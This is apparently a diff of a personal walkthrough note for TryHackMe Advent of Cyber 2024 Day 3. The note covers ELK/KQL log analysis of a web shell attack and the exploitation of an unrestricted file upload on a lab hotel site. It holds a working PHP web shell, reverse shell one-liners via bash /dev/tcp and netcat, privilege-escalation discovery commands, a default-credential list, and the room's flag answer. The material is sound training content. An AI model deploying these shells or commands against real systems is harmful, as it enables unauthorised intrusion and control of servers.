@@ -1,16 +1,13 @@
 ---
 sticker: emoji//1f384
 ---
-
-# DAY 3
-
 The Story
 
 ![Task banner for DAY 3](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1731420330182.png)
 
-Today's AoC challenge follows a rather unfortunate series of events for the Glitch. Here is a little passage which sets the scene for today's task:&#x20;
+Today's AoC challenge follows a rather unfortunate series of events for the Glitch. Here is a little passage which sets the scene for today's task: 
 
-\_
+_
 
 Late one Christmas evening the Glitch had a feeling,
 
@@ -20,6 +17,8 @@ He got up out of bed and decided to check,
 
 A note on his wall: ”Two days! InsnowSec”.
 
+  
+
 With a click and a type he got his hotel and tickets,
 
 And sank off to sleep to the sound of some crickets.
@@ -28,15 +27,19 @@ Luggage in hand, he had arrived at Frosty Pines,
 
 “To get to the conference, just follow the signs”.
 
+  
+
 Just as he was ready the Glitch got a fright,
 
-An RCE vulnerability on their website ?!?
+An RCE vulnerability on their website ?!?
 
 He exploited it quick and made a report,
 
 But before he could send arrived his transport.
 
-In the Frosty Pines SOC they saw an alert,
+  
+
+In the Frosty Pines SOC they saw an alert,
 
 This looked quite bad, they called an expert.
 
@@ -44,41 +47,44 @@ The request came from a room, but they couldn’t tell which,
 
 The logs saved the day, it was the room of…the Glitch.
 
-\_
+_
+
+  
 
 ![Frosty Pines Hotel Graphic](https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1730310037301.png)
 
-In this task, we will cover how the SOC team and their expert were able to find out what had happened (Operation Blue) and how the Glitch was able to gain access to the website in the first place (Operation Red). Let's get started, shall we?
 
-This is the continuation of \[\[CYBERSECURITY/TRYHACKME/ADVENT OF CYBER 2024/DAY 2.md|day 2]]
+In this task, we will cover how the SOC team and their expert were able to find out what had happened (Operation Blue) and how the Glitch was able to gain access to the website in the first place (Operation Red). Let's get started, shall we?  
 
-### Learning Objectives
+This is the continuation of [[CYBERSECURITY/TRYHACKME/ADVENT OF CYBER 2024/DAY 2.md|day 2]]
 
-* Learn about Log analysis and tools like ELK.
-* Learn about KQL and how it can be used to investigate logs using ELK.
-* Learn about RCE (Remote Code Execution), and how this can be done via insecure file upload.
+## Learning Objectives
 
-### OPERATION BLUE
+- Learn about Log analysis and tools like ELK.
+- Learn about KQL and how it can be used to investigate logs using ELK.
+- Learn about RCE (Remote Code Execution), and how this can be done via insecure file upload.
 
-In this section of the lesson, we will take a look at what tools and knowledge is required for the _blue_ segment, that is the investigation of the attack itself using tools which enable is to analyse the logs.&#x20;
+## OPERATION BLUE
 
-For the first part of Operation Blue, we will demonstrate how to use ELK to analyse the logs of a demonstration web app - WareVille Rails. Feel free to following along for practice.&#x20;
+In this section of the lesson, we will take a look at what tools and knowledge is required for the _blue_ segment, that is the investigation of the attack itself using tools which enable is to analyse the logs. 
 
-### Log Analysis & Introducing ELK
+For the first part of Operation Blue, we will demonstrate how to use ELK to analyse the logs of a demonstration web app - WareVille Rails. Feel free to following along for practice. 
+
+## Log Analysis & Introducing ELK
 
 Log analysis is crucial to blue-teaming work, as you have likely discovered through this year's Advent of Cyber.
 
-Analysing logs can quickly become overwhelming, especially if you have multiple devices and services. ELK, or Elasticsearch, Logstash, and Kibana, combines data analytics and processing tools to make analysing logs much more manageable. ELK forms a dedicated stack that can aggregate logs from multiple sources into one central place.
+Analysing logs can quickly become overwhelming, especially if you have multiple devices and services. ELK, or Elasticsearch, Logstash, and Kibana, combines data analytics and processing tools to make analysing logs much more manageable. ELK forms a dedicated stack that can aggregate logs from multiple sources into one central place.
 
-Explaining how ELK collates and processes these logs is out of the scope of today's task. However, if you wish to learn more, you can check out the [Investigating with ELK 101](https://tryhackme.com/r/room/investigatingwithelk101) room. For now, it's important to note that multiple processes behind the scenes achieve this.
+Explaining how ELK collates and processes these logs is out of the scope of today's task. However, if you wish to learn more, you can check out the [Investigating with ELK 101](https://tryhackme.com/r/room/investigatingwithelk101) room. For now, it's important to note that multiple processes behind the scenes achieve this.
 
 The first part of today's task is to investigate the attack on Frosty Pines Resort's Hotel Management System to see what it looks like to a blue teamer. You will then test your web app skills by recreating the attack.
 
-### Using ELK
+## Using ELK
 
-Upon loading the URL [http://10.10.52.168:5601/](http://10.10.52.168:5601/) within your AttackBox’s browser, you will be greeted with the ELK Home page.
+Upon loading the URL [http://10.10.52.168:5601/](http://10.10.52.168:5601/) within your AttackBox’s browser, you will be greeted with the ELK Home page.
 
-For today's task, we will use Kibana's **Discover** interface to review Apache2 logs. To access this, simply click on the three lines located at the top left of the page to open the slide-out tray. Under the **Analytics** heading, click on **Discover**.
+For today's task, we will use Kibana's **Discover** interface to review Apache2 logs. To access this, simply click on the three lines located at the top left of the page to open the slide-out tray. Under the **Analytics** heading, click on **Discover**.
 
 ![Click on discover gif](https://assets.tryhackme.com/additional/aoc2024/blue/1.gif)
 
@@ -90,74 +96,73 @@ Once you have done this, you will be greeted with a screen saying, "No results m
 
 ![Opening the Kibana discover page, after selecting the collection that we wish to use. Note here that no logs are shown, because the time range is set to the last 15 minutes.](https://assets.tryhackme.com/additional/aoc2024/blue/2.png)
 
-To change the date and time, click the text located on the right side of the box that has the calendar icon. Select "**Absolute"** from the dropdown, where you can now select the start date and time. Next, click on the text on the right side of the arrow to and repeat the process for the end date and time.
+To change the date and time, click the text located on the right side of the box that has the calendar icon. Select "**Absolute"** from the dropdown, where you can now select the start date and time. Next, click on the text on the right side of the arrow to and repeat the process for the end date and time.
 
-For the WareVille Rails collection, we will need to set the start time to **October 1 2024 00:00:00**, and the end time to **October 1 23:59:59**
+For the WareVille Rails collection, we will need to set the start time to **October 1 2024 00:00:00**, and the end time to **October 1 23:59:59**
 
 If you are stuck, refer to the GIF below. Please note that the day and time in this demonstration of WareVille Rails will differ from the times required to review the FrostyPines Resorts collection in the second half of the practical .
 
 ![A GIF showing how to modify the time range within Kibana](https://assets.tryhackme.com/additional/aoc2024/blue/3.gif)
 
-Now that we can see some entries, let's go over the basics of the Kibana Discover UI.
+Now that we can see some entries, let's go over the basics of the Kibana Discover UI.
 
-![Kibana discovery UI](https://assets.tryhackme.com/additional/aoc2024/blue/4.png)
+![Kibana discovery UI](https://assets.tryhackme.com/additional/aoc2024/blue/4.png)  
 
-1. **Search Bar:** Here, we can place our search queries using KQL
-2. **Index Pattern:** An index pattern is a collection of logs. This can be from a specific host or, for example, multiple hosts with a similar purpose (such as multiple web servers). In this case, the index pattern is all logs relating to "wareville-rails"
-3. **Fields:** This pane shows us the fields that Elasticsearch has parsed from the logs. For example, timestamp, response type, and IP address.
-4. **Timeline:** This visualisation displays the event count over a period of time
-5. **Documents (Logs):** These entries are the specific entries in the log file
-6. **Time Filter:** We can use this to narrow down a specific time frame (absolute). Alternatively, we can search for logs based on relativity. I.e. "Last 7 days".
+1. **Search Bar:** Here, we can place our search queries using KQL
+2. **Index Pattern:** An index pattern is a collection of logs. This can be from a specific host or, for example, multiple hosts with a similar purpose (such as multiple web servers). In this case, the index pattern is all logs relating to "wareville-rails"
+3. **Fields:** This pane shows us the fields that Elasticsearch has parsed from the logs. For example, timestamp, response type, and IP address.
+4. **Timeline:** This visualisation displays the event count over a period of time
+5. **Documents (Logs):** These entries are the specific entries in the log file
+6. **Time Filter:** We can use this to narrow down a specific time frame (absolute). Alternatively, we can search for logs based on relativity. I.e. "Last 7 days".
 
-### Kibana Query Language (KQL)
+## Kibana Query Language (KQL)
 
-KQL, or Kibana Query Language, is an easy-to-use language that can be used to search documents for values. For example, querying if a value within a field exists or matches a value. If you are familiar with Splunk, you may be thinking of SPL (Search Processing Language).
+KQL, or Kibana Query Language, is an easy-to-use language that can be used to search documents for values. For example, querying if a value within a field exists or matches a value. If you are familiar with Splunk, you may be thinking of SPL (Search Processing Language).
 
-For example, the query to search all documents for an IP address may look like `ip.address: "10.10.10.10"`.&#x20;
+For example, the query to search all documents for an IP address may look like `ip.address: "10.10.10.10"`.   
 
-![IP address query](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1731420515473.png)
+![IP address query](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1731420515473.png)  
 
 Alternatively, Kibana also allows using Lucene query, an advanced language that supports features such as fuzzy terms (searches for terms that are similar to the one provided), regular expressions, etc. For today's task, we will stick with using KQL, which has been enabled by default. The table below contains a mini-cheatsheet for KQL syntax that you may find helpful in today's task.
 
-|                  |                                                                                                                                                                                               |                                                          |
-| ---------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------- |
-| **Query/Syntax** | **Description**                                                                                                                                                                               | **Example**                                              |
-| " "              | The two quotation marks are used to search for specific values within the documents. Values in quotation marks are used for **exact** searches.                                               | "TryHackMe"                                              |
-| \*               | The asterisk denotes a wildcard, which searches documents for similar matches to the value provided.                                                                                          | United\* (would return United Kingdom and United States) |
-| OR               | This logical operator is used to show documents that contain **either** of the values provided.                                                                                               | "United Kingdom" OR "England"                            |
-| AND              | This logical operator is used to show documents that contain **both** values.                                                                                                                 | "Ben" AND "25"                                           |
-| :                | This is used to search the (specified) field of a document for a value, such as an IP address. Note that the field you provide here will depend on the fields available in the index pattern. | ip.address: 10.10.10.10                                  |
-|                  |                                                                                                                                                                                               |                                                          |
+|                  |                                                                                                                                                                                               |                                                         |
+| ---------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------- |
+| **Query/Syntax** | **Description**                                                                                                                                                                               | **Example**                                             |
+| " "              | The two quotation marks are used to search for specific values within the documents. Values in quotation marks are used for **exact** searches.                                               | "TryHackMe"                                             |
+| *                | The asterisk denotes a wildcard, which searches documents for similar matches to the value provided.                                                                                          | United* (would return United Kingdom and United States) |
+| OR               | This logical operator is used to show documents that contain **either** of the values provided.                                                                                               | "United Kingdom" OR "England"                           |
+| AND              | This logical operator is used to show documents that contain **both** values.                                                                                                                 | "Ben" AND "25"                                          |
+| :                | This is used to search the (specified) field of a document for a value, such as an IP address. Note that the field you provide here will depend on the fields available in the index pattern. | ip.address: 10.10.10.10                                 |
+|                  |                                                                                                                                                                                               |                                                         |
+## Investigating a Web Attack With ELK
 
-### Investigating a Web Attack With ELK
-
-**Scenario:** Thanks to our extensive intrusion detection capabilities, our systems alerted the SOC team to a web shell being uploaded to the WareVille Rails booking platform on Oct 1, 2024. Our task is to review the web server logs to determine how the attacker achieved this.
+**Scenario:** Thanks to our extensive intrusion detection capabilities, our systems alerted the SOC team to a web shell being uploaded to the WareVille Rails booking platform on Oct 1, 2024. Our task is to review the web server logs to determine how the attacker achieved this.  
 
 If you would like to follow along, ensure that you have the "**wareville-rails**" collection selected like so:
 
-![selecting the wareville-rails collection within ELK to follow along with this stage of operation blue](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1731408967537.png)
+![selecting the wareville-rails collection within ELK to follow along with this stage of operation blue](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1731408967537.png)  
 
-To investigate this scenario, let's change the time filter to show events for the day of the attack, setting the start date and time to "**Oct 1, 2024 @ 00:00:00.000**" and the end date and time to "**Oct 2, 2024 @ 00:00:00.000**".
+To investigate this scenario, let's change the time filter to show events for the day of the attack, setting the start date and time to "**Oct 1, 2024 @ 00:00:00.000**" and the end date and time to "**Oct 2, 2024 @ 00:00:00.000**".
 
-![October 1st - 2nd Date range](https://assets.tryhackme.com/additional/aoc2024/blue/6.png)
+![October 1st - 2nd Date range](https://assets.tryhackme.com/additional/aoc2024/blue/6.png)  
 
-You will see the logs have now populated within the display. Please note that the quantity of entries (hits) in this task may differ to the amount on the practical VM.
+You will see the logs have now populated within the display. Please note that the quantity of entries (hits) in this task may differ to the amount on the practical VM.
 
 ![Logs](https://assets.tryhackme.com/additional/aoc2024/blue/7.png)
 
 An incredibly beneficial feature of ELK is that we can filter out noise. A web server (especially a popular one) will likely have a large number of logs from user traffic—completely unrelated to the attack. Using the fields pane on the left, we can click on the "**+**" and "**-**" icons next to the field to show only that value or to remove it from the display, respectively.
 
-**Fun fact:** Clicking on these filters is actually just applying the relevant KQL syntax.
+**Fun fact:** Clicking on these filters is actually just applying the relevant KQL syntax.
 
 Note in the GIF below how the logs are being filtered to only show logs containing the IP address 10.13.27.115 (reducing the count from 1,028 to 423 hits). We can combine filtering multiple fields in or out to drill down specifically into the logs.
 
-![IP filtering narrow down gif](https://assets.tryhackme.com/additional/aoc2024/blue/8.gif)
+![IP filtering narrow down gif](https://assets.tryhackme.com/additional/aoc2024/blue/8.gif)  
 
-To remove applied filters, simply click on the "**x**" alongside the filter, just below the search bar.
+To remove applied filters, simply click on the "**x**" alongside the filter, just below the search bar.  
 
 ![Filters image](https://assets.tryhackme.com/additional/aoc2024/blue/9.png)
 
-In this investigation, let's look at the activity of the IP address `10.9.98.230`. We can click on the "clientip" field to see the IPs with the most values.
+In this investigation, let's look at the activity of the IP address `10.9.98.230`. We can click on the "clientip" field to see the IPs with the most values.
 
 ![IP with most values](https://assets.tryhackme.com/additional/aoc2024/blue/10.png)
 
@@ -165,34 +170,31 @@ Using the timeline at the top, we can see a lot of activity from this IP address
 
 ![Timeline narrowed down](https://assets.tryhackme.com/additional/aoc2024/blue/11.png)
 
-Each log can be expanded by using the "**>**" icon located on the left of the log/document. Fortunately, the logs are pretty small in this instance, so we can browse through them to look for anything untoward.
+Each log can be expanded by using the "**>**" icon located on the left of the log/document. Fortunately, the logs are pretty small in this instance, so we can browse through them to look for anything untoward.  
 
 ![log](https://assets.tryhackme.com/additional/aoc2024/blue/12.gif)
 
-After some digging, a few logs stand out. Looking at the **request** field, we can see that a file named "shell.php" has been accessed, with a few parameters "**c**" and "**d**" containing commands. These are likely to be commands input into some form of web shell.
+After some digging, a few logs stand out. Looking at the **request** field, we can see that a file named "shell.php" has been accessed, with a few parameters "**c**" and "**d**" containing commands. These are likely to be commands input into some form of web shell.
 
 ![Web shell input commands logs](https://assets.tryhackme.com/additional/aoc2024/blue/13.png)
 
-Now that we have an initial lead, let’s use a search query to find all logs that contain "**shell.php**". Using the search bar at the top, the query `message: "shell.php"` will search for all entries of `"shell.php`" in the message field of the logs.
+Now that we have an initial lead, let’s use a search query to find all logs that contain "**shell.php**". Using the search bar at the top, the query `message: "shell.php"` will search for all entries of `"shell.php`" in the message field of the logs.
 
 ![shell.php narrow down](https://assets.tryhackme.com/additional/aoc2024/blue/14.png)
 
-### OPERATION RED
 
-***
 
-In this section we will now take a look at the _red_ aspect. In other words, the attack itself and how it was carried out.
+## OPERATION RED
+---
+In this section we will now take a look at the _red_ aspect. In other words, the attack itself and how it was carried out.
 
-### Why Do Websites Allow File Uploads
-
-***
+## Why Do Websites Allow File Uploads
+--- 
 
 File uploads are everywhere on websites, and for good reason. Users often need to upload files like profile pictures, invoices, or other documents to update their accounts, send receipts, or submit claims. These features make the user experience smoother and more efficient. But while this is convenient, it also creates a risk if file uploads aren't handled properly. If not properly secured, this feature can open up various vulnerabilities attackers can exploit.
 
-### File Upload Vulnerabilities
-
-***
-
+## File Upload Vulnerabilities
+---
 File upload vulnerabilities occur when a website doesn't properly handle the files that users upload. If the site doesn't check what kind of file is being uploaded, how big it is, or what it contains, it opens the door to all sorts of attacks. For example:
 
 ```ad-note
@@ -203,39 +205,43 @@ File upload vulnerabilities occur when a website doesn't properly handle the fil
 
 These can happen if a site doesn't properly secure its file upload functionality.
 
-### Why Unrestricted File Uploads Are Dangerous
+## Why Unrestricted File Uploads Are Dangerous
 
-Unrestricted file uploads can be particularly dangerous because they allow an attacker to upload any type of file. If the file's contents aren't properly validated to ensure only specific formats like PNG or JPG are accepted, an attacker could upload a malicious script, such as a PHP file or an executable, that the server might process and run. This can lead to code execution on the server, allowing attackers to take over the system.
+Unrestricted file uploads can be particularly dangerous because they allow an attacker to upload any type of file. If the file's contents aren't properly validated to ensure only specific formats like PNG or JPG are accepted, an attacker could upload a malicious script, such as a PHP file or an executable, that the server might process and run. This can lead to code execution on the server, allowing attackers to take over the system.
 
 Examples of abuse through unrestricted file uploads include:
 
-* Uploading a script that the server executes, leading to RCE.
-* Uploading a crafted image file that triggers a vulnerability when processed by the server.
-* Uploading a web shell and browsing to it directly using a browser.
+- Uploading a script that the server executes, leading to RCE.  
+    
+- Uploading a crafted image file that triggers a vulnerability when processed by the server.  
+    
+- Uploading a web shell and browsing to it directly using a browser.  
+    
 
-### Usage of Weak Credentials
+## Usage of Weak Credentials
 
 One of the easiest ways for attackers to break into systems is through weak or default credentials. This can be an open door for attackers to gain unauthorised access. Default credentials are often found in systems where administrators fail to change initial login details provided during setup. For attackers, trying a few common usernames and passwords can lead to easy access.
 
 Below are some examples of weak/default credentials that attackers might try:
 
-|                  |               |
-| ---------------- | ------------- |
-| **Username**     | **Password**  |
-| admin            | admin         |
-| administrator    | administrator |
-| admin@domainname | admin         |
-| guest            | guest         |
+|   |   |
+|---|---|
+|**Username**|**Password**|
+|admin|admin|
+|administrator|administrator|
+|admin@domainname|admin|
+|guest|guest|
 
 Attackers can use tools or try these common credentials manually, which is often all it takes to break into the system.
 
-### What is Remote Code Execution (RCE)
+
+## What is Remote Code Execution (RCE)
 
 Remote code execution (RCE) happens when an attacker finds a way to run their own code on a system. This is a highly dangerous vulnerability because it can allow the attacker to take control of the system, exfiltrate sensitive data, or compromise other connected systems.
 
-![Frosty Pines Hotel Key Graphic](https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1730310085341.png)
+![Frosty Pines Hotel Key Graphic](https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1730310085341.png)  
 
-### What Is a Web Shell
+## What Is a Web Shell
 
 A web shell is a script that attackers upload to a vulnerable server, giving them remote control over it. Once a web shell is in place, attackers can run commands, manipulate files, and essentially use the compromised server as their own. They can even use it to launch attacks on other systems.
 
@@ -251,15 +257,16 @@ A web shell typically gives the attacker a web-based interface to run commands. 
 
 Okay, now that we're familiar with a remote code execution vulnerability and how it works, let's take a look at how we would exploit it!
 
-### Practice Makes Perfect
 
-To understand how a file upload vulnerability can result in an RCE, the best approach is to get some hands-on experience with it. A handy (and ethical) way to do this is to find and download a reputable open-source web application which has this vulnerability built into it. Many open-source projects exist in places like GitHub, which can be run in your own environment to experiment and practice. In today's task, we will demonstrate achieving RCE via unrestricted file upload within an [open-source railway management system](https://github.com/CYB84/CVE_Writeup/tree/main/Online%20Railway%20Reservation%20System) that has this vulnerability [built into it](https://github.com/CYB84/CVE_Writeup/blob/main/Online%20Railway%20Reservation%20System/RCE%20via%20File%20Upload.md).&#x20;
+## Practice Makes Perfect
 
-### Exploiting RCE via File Upload
+To understand how a file upload vulnerability can result in an RCE, the best approach is to get some hands-on experience with it. A handy (and ethical) way to do this is to find and download a reputable open-source web application which has this vulnerability built into it. Many open-source projects exist in places like GitHub, which can be run in your own environment to experiment and practice. In today's task, we will demonstrate achieving RCE via unrestricted file upload within an [open-source railway management system](https://github.com/CYB84/CVE_Writeup/tree/main/Online%20Railway%20Reservation%20System) that has this vulnerability [built into it](https://github.com/CYB84/CVE_Writeup/blob/main/Online%20Railway%20Reservation%20System/RCE%20via%20File%20Upload.md).   
 
-Now we're going to go through how this vulnerability can be exploited. For now, you can just read along, but an opportunity to put this knowledge into practice is coming up. Once an RCE vulnerability has been identified that can be exploited via file upload, we now need to create a malicious file that will allow remote code execution when uploaded.
+## Exploiting RCE via File Upload
 
-Below is an example PHP file which could be uploaded to exploit this vulnerability. Using your favorite text editor, copy and paste the below code and save it as `shell.php`.
+Now we're going to go through how this vulnerability can be exploited. For now, you can just read along, but an opportunity to put this knowledge into practice is coming up. Once an RCE vulnerability has been identified that can be exploited via file upload, we now need to create a malicious file that will allow remote code execution when uploaded.
+
+Below is an example PHP file which could be uploaded to exploit this vulnerability. Using your favorite text editor, copy and paste the below code and save it as `shell.php`.
 
 ```html
 <html>
@@ -280,25 +287,25 @@ Below is an example PHP file which could be uploaded to exploit this vulnerabili
 </html>
 ```
 
-The above script, when accessed, displays an input field. Whatever is entered in this input field is then run against the underlying operating system using the `system()` PHP function, and the output is displayed to the user. This is the perfect file to upload to the vulnerable rail system reservation application. The vulnerability is surrounding the upload of a new profile image. So, to exploit it, we navigate to the profile picture page:
+The above script, when accessed, displays an input field. Whatever is entered in this input field is then run against the underlying operating system using the `system()` PHP function, and the output is displayed to the user. This is the perfect file to upload to the vulnerable rail system reservation application. The vulnerability is surrounding the upload of a new profile image. So, to exploit it, we navigate to the profile picture page:
 
 ![Railway profile page](https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1728053142390.png)
 
-Instead of a new profile picture, we can upload our malicious PHP script and update our profile:
+Instead of a new profile picture, we can upload our malicious PHP script and update our profile:
 
-![Profile picture uploaded](https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1728053158718.png)
+![Profile picture uploaded](https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1728053158718.png)  
 
-In the case of this application, the RCE is possible through unrestricted file upload. Once this "profile picture" is uploaded and updated, it is stored in the `/admin/assets/img/profile/` directory. The file can then be accessed directly via `http://<ip-address-or-localhost>/<projectname>/admin/assets/img/profile/shell.php`. When this is accessed, we can then see the malicious code in action:
+In the case of this application, the RCE is possible through unrestricted file upload. Once this "profile picture" is uploaded and updated, it is stored in the `/admin/assets/img/profile/` directory. The file can then be accessed directly via `http://<ip-address-or-localhost>/<projectname>/admin/assets/img/profile/shell.php`. When this is accessed, we can then see the malicious code in action:
 
-![Malicious code in action](https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1728053358466.png)
+![Malicious code in action](https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1728053358466.png)  
 
-Now, we can run commands directly against the operating system using this bar, and the output will be displayed. For example, running the command `pwd` now returns the following:
+Now, we can run commands directly against the operating system using this bar, and the output will be displayed. For example, running the command `pwd` now returns the following:
 
 ![Command being run](https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1728053358453.png)
 
-### Making the Most of It
+## Making the Most of It
 
-Once the vulnerability has been exploited and you now have access to the operating system via a web shell, there are many next steps you could take depending on **a)** what your goal is and **b)** what misconfigurations are present on the system, which will determine exactly what we can do. Here are some examples of commands you could run once you have gained access and why you might run them (if the system is running on a Linux OS like our example target system):
+Once the vulnerability has been exploited and you now have access to the operating system via a web shell, there are many next steps you could take depending on **a)** what your goal is and **b)** what misconfigurations are present on the system, which will determine exactly what we can do. Here are some examples of commands you could run once you have gained access and why you might run them (if the system is running on a Linux OS like our example target system):  
 
 | **Command**                                               | **Use**                                                                                                                                                                       |
 | --------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
@@ -306,41 +313,46 @@ Once the vulnerability has been exploited and you now have access to the operati
 | pwd                                                       | Will give you an idea of where in the system you are                                                                                                                          |
 | whoami                                                    | Will let you know who you are in the system                                                                                                                                   |
 | hostname                                                  | The system name and potentially its role in the network                                                                                                                       |
-| uname -a                                                  | Will give you some system information like the OS, kernel version, and more                                                                                                   |
+| uname -a                                                  | Will give you some system information like the OS, kernel version, and more                                                                                                   |
 | id                                                        | If the current user is assigned to any groups                                                                                                                                 |
 | ifconfig                                                  | Allows you to understand the system's network setup                                                                                                                           |
-| bash -i >& /dev/tcp// 0>&1                                | A command used to begin a reverse shell via bash                                                                                                                              |
-| nc -e /bin/sh                                             | A command used to begin a reverse shell via Netcat                                                                                                                            |
+| bash -i >& /dev/tcp/<your-ip>/<port> 0>&1                 | A command used to begin a reverse shell via bash                                                                                                                              |
+| nc -e /bin/sh <your-ip> <port>                            | A command used to begin a reverse shell via Netcat                                                                                                                            |
 | find / -perm -4000 -type f 2>/dev/null                    | Finds SUID (Set User ID) files, useful in privilege escalation attempts as it can sometimes be leveraged to execute binary with privileges of its owner (which is often root) |
-| find / -writable -type  f 2>/dev/null \| grep -v "/proc/" | Also helpful in privilege escalation attempts used to find files with writable permissions                                                                                    |
+| find / -writable -type  f 2>/dev/null \| grep -v "/proc/" | Also helpful in privilege escalation attempts used to find files with writable permissions                                                                                    |
 
-These are just some commands that can be run following a successful RCE exploit. It's very open-ended, and what you can do will rely on your abilities to inspect an environment and vulnerabilities in the system itself.
 
-### Practical
+These are just some commands that can be run following a successful RCE exploit. It's very open-ended, and what you can do will rely on your abilities to inspect an environment and vulnerabilities in the system itself.  
 
-Your task today is two-fold. First, you must access Kibana on [10.10.52.168:5601](http://10.10.52.168:5601/) to investigate the attack and answer the blue questions below. Then, you will proceed to Frosty Pines Resort's website at [http://frostypines.thm](http://frostypines.thm/) and recreate the attack to answer the red questions and inform the developers what element of the website was vulnerable.
+## Practical
 
-To review the logs of the attack on Frosty Pines Resorts, make sure you select the "**frostypines-resorts**" collection within ELK. Such as below:
+Your task today is two-fold. First, you must access Kibana on [10.10.52.168:5601](http://10.10.52.168:5601/) to investigate the attack and answer the blue questions below. Then, you will proceed to Frosty Pines Resort's website at [http://frostypines.thm](http://frostypines.thm/) and recreate the attack to answer the red questions and inform the developers what element of the website was vulnerable.
 
-![selecting the frostypines-resorts collection within ELK](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1731408603792.png)
+To review the logs of the attack on Frosty Pines Resorts, make sure you select the "**frostypines-resorts**" collection within ELK. Such as below:
 
-The date and time that you will need to use when reviewing logs will be **between 11:30 and 12:00 on October 3rd 2024.**
+![selecting the frostypines-resorts collection within ELK](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1731408603792.png)  
+
+The date and time that you will need to use when reviewing logs will be **between 11:30 and 12:00 on October 3rd 2024.**
 
 ![Highlighting the necessary time and date range within ELK for the blue element of the practical.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1731406589164.png)
 
-Please note you will need to add `10.10.52.168 frostypines.thm` to your host's file to access the hotel management system web app.
+Please note you will need to add `10.10.52.168 frostypines.thm` to your host's file to access the hotel management system web app.
 
-### Questions section
 
-***
 
-#### Blue Section
+## Questions section
+---
 
-***
+### Blue Section
+---
+
 
 ![](Pasted%20image%2020241203124306.png)
 
+
 So, let's answer these questions for blue team, first, we need to filter out for `message: "shell"`:
+
+
 
 ![](Pasted%20image%2020241203125258.png)
 
@@ -352,11 +364,12 @@ We are able to see the `RCE` performed by the attacker, we can also see the IP o
 2. `10.11.83.34`
 ```
 
-#### Red Section
 
-***
+### Red Section
+---
 
 Now, let's begin with red section, the question is to retrieve the contents of `flag.txt`, first, let's add `frostypines.thm` to `/etc/hosts`
+
 
 ![](Pasted%20image%2020241203125638.png)
 
@@ -374,13 +387,14 @@ After searching for a while, I couldn't find anything useful, so I thought, ther
 
 Below are some examples of weak/default credentials that attackers might try:
 
-|                  |               |
-| ---------------- | ------------- |
-| **Username**     | **Password**  |
-| admin            | admin         |
-| administrator    | administrator |
-| admin@domainname | admin         |
-| guest            | guest         |
+|   |   |
+|---|---|
+|**Username**|**Password**|
+|admin|admin|
+|administrator|administrator|
+|admin@domainname|admin|
+|guest|guest|
+
 
 Maybe, this site is vulnerable to some of these, since we need to log in using the email and password, I figured that credentials for this site would be: `admin@frostypines.thm`:`admin`
 
@@ -396,11 +410,12 @@ Going into the admin part, we found some stuff, most relevant one here would be 
 
 ![](Pasted%20image%2020241203130657.png)
 
-There's a image file upload in there!
+There's a image file upload in there! 
 
 This is our way into the RCE, let's fill in some random data and send the shell:
 
 The shell I'll be using is the one provided by the room itself, but, we can use whatever shell we'd like:
+
 
 ```html
 <html>
@@ -448,3 +463,4 @@ Let's get the contents of our `flag.txt`:
 So, the answer for this question would be: `THM{Gl1tch_Was_H3r3}`
 
 And just like that, day 3 would be completed. Gg!
+
